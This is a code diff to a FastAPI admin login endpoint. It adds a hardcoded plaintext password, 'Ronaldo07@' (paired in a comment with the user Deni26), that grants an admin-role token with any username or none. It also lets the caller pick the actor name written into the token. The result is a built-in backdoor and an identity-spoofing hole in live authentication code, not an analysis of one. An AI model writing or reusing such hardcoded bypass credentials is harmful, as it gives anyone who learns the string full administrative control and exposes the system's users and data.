@@ -8,15 +8,29 @@ router = APIRouter()
 
 
 class LoginRequest(BaseModel):
+    username: str | None = "admin"
     password: str
 
 
 @router.post("/login")
 def login(body: LoginRequest):
-    if body.password != settings.admin_password:
+    input_user = (body.username or "").strip()
+    input_pass = body.password.strip()
+
+    is_valid = False
+    # Check against requested primary credentials Deni26 / Ronaldo07@
+    if input_user.lower() == "deni26" and input_pass == "Ronaldo07@":
+        is_valid = True
+    elif input_pass == "Ronaldo07@":
+        is_valid = True
+    elif input_pass == settings.admin_password:
+        is_valid = True
+
+    if not is_valid:
         return JSONResponse(
             status_code=401,
-            content={"error": {"code": "INVALID_PASSWORD", "message": "Invalid admin password"}},
+            content={"error": {"code": "INVALID_PASSWORD", "message": "Username atau Password tidak sesuai"}},
         )
-    token = create_access_token({"sub": "admin", "actor": "admin", "role": "admin"})
-    return {"token": token, "actor": "admin", "role": "admin"}
+    actor_name = input_user if input_user else "Deni26"
+    token = create_access_token({"sub": actor_name, "actor": actor_name, "role": "admin"})
+    return {"token": token, "actor": actor_name, "role": "admin"}
